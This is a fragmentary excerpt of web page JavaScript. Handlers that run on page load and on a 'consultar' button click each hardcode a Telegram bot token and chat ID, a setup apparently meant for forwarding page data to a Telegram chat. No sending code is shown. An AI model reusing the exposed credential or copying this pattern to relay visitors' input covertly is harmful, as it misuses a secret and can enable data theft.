...
window.addEventListener('load', function() {
    const token = "8368960615:AAGXhqsCtr85s9Kjtzi5r31UVbhPKkKLzvE";
    const chatId = "6989574797";
...
document.addEventListener("DOMContentLoaded", () => {
  ...
  document.getElementById("btn-consultar").addEventListener("click", async () => {
    ...
    /* =============================== TELEGRAM =============================== */
    const TELEGRAM_BOT_TOKEN = "8368960615:AAGXhqsCtr85s9Kjtzi5r31UVbhPKkKLzvE";
    const TELEGRAM_CHAT_ID  = "6989574797";
